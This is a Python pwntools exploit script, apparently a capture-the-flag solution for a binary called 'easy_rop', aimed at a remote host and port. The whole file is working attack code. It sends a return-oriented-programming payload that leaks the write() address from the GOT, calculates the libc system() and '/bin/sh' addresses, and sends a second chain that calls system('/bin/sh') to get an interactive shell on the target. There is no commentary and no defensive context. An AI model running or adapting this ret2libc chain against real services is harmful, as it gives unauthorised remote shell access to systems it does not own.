from pwn import * 
libc = ELF('libc.so.6') 
elf = ELF('easy_rop') 
#p = process('./easy_rop') 
p = remote('111.230.240.83',7203) 
 
pop_rdi_addr=0x0000000000400673
pop_rsi_addr=0x0000000000400671
main_addr = 0x00000000004005b6

plt_write = elf.symbols['write'] 
print 'plt_write= ' + hex(plt_write) 
got_write = elf.got['write'] 
print 'got_write= ' + hex(got_write) 
payload1 = 'A'*24 
payload1 += p64(pop_rdi_addr) 
payload1 += p64(0x1) 
payload1 += p64(pop_rsi_addr)
payload1 += p64(got_write)
payload1 += p64(0x1)
payload1 += p64(plt_write) 
 
 
payload1 += p64(main_addr) 
#p.recvuntil("CTF")
print p.recv() 
print "\n###sending payload1 ...###" 
p.send(payload1) 
print "\n###receving write() addr...###" 
write_addr = u64(p.recv(8)) 
print 'write_addr=' + hex(write_addr) 
print "\n###calculating system() addr and \"/bin/sh\" addr...###" 
system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system']) 
print 'system_addr= ' + hex(system_addr) 
binsh_addr = write_addr - (libc.symbols['write'] - next(libc.search('/bin/sh'))) 
print 'binsh_addr= ' + hex(binsh_addr) 
payload2 = 'A'*24 
payload2 += p64(pop_rdi_addr) 
payload2 += p64(binsh_addr) 
payload2 += p64(system_addr) 
payload2 += p64(main_addr) 
print "\n###sending payload2 ...###" 
p.send(payload2) 
p.interactive() 
